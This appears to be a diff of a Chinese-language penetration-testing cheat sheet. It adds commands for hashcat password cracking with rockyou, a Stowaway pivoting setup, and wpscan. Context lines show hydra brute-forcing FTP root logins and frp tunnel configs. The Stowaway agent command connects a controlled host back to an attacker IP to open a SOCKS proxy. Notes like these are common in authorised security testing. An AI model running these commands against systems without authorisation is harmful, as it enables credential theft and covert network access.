@@ -21,7 +21,7 @@ hashcat.exe <hashfile> <dict>
 ```
 
 ```bash
- 
+hashcat.exe  .\hash D:\dict\wordlists\rockyou.txt
 ```
 ## 软连接
 在/bin/mklink
@@ -73,6 +73,8 @@ ftp
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> ftp
 ```
+
+
 ## xray
 ```shell
 //基础爬虫爬取并对爬虫爬取的链接进行漏洞扫描
@@ -123,6 +125,7 @@ password = "abc"
 
 
 #### frps_all
+
 ```toml
  
 # This configuration file is for reference only. Please do not use this configuration directly to run the program as it may have various issues.
@@ -344,7 +347,9 @@ ops = ["NewProxy"]
  
  
 ```
+
 #### frpc_all
+
 ```toml
  
 # This configuration file is for reference only. Please do not use this configuration directly to run the program as it may have various issues.
@@ -846,5 +851,31 @@ socks5
 - frps
 ```toml
 
+
+```
+
+## stowaway
+
+攻击机部署admin
+```
+.\windows_x64_admin.exe -l 9999
+```
+
+被控端
+```
+./linux_x64_agent -c 192.166.183.253:8888
+```
+
+panel操作
+```
+detail #查看node详情
+use 0 使用0节点
+socks 6005 开启6005代理
+```
+
+## wpscan
+
+```
+wpscan --url <url> --disable-tls-checks #禁用tls，否则更新不了
 
 ```
